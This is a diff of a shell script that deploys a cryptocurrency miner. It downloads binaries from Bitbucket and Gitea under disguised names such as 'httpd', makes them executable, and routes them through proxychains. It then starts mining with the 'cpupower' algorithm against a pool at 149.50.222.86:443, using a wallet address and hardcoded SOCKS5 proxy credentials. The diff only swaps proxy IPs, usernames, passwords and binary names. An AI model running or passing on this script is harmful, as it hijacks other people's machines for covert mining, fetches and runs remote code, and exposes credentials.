@@ -1,9 +1,9 @@
-proxy="34.238.108.61" 
+proxy="50.17.160.202" 
 port="1080" 
-user="anwai69c1nzg3n"  
-pass="kmcgkrex2jp0lsd0rw2q5qgnq14ujk" 
-wget -q -O vx https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x vx
-wget -q -O xm https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x xm 
+user="s0xa2xicwh8i36"  
+pass="811noty1dt532rfecresmotogphkbd" 
+wget -q -O kva https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x kva
+wget -q -O diamon https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x diamon 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./xm ./vx -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 8-999 -n 1)-vinaastri) -p c=CPU -x socks5://anwai69c1nzg3n:kmcgkrex2jp0lsd0rw2q5qgnq14ujk@34.239.17.55:1080 
+./diamon ./kva -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 80-999 -n 1)-sansjaya) -p c=CPU -x socks5://s0xa2xicwh8i36:811noty1dt532rfecresmotogphkbd@50.17.160.202:1080 
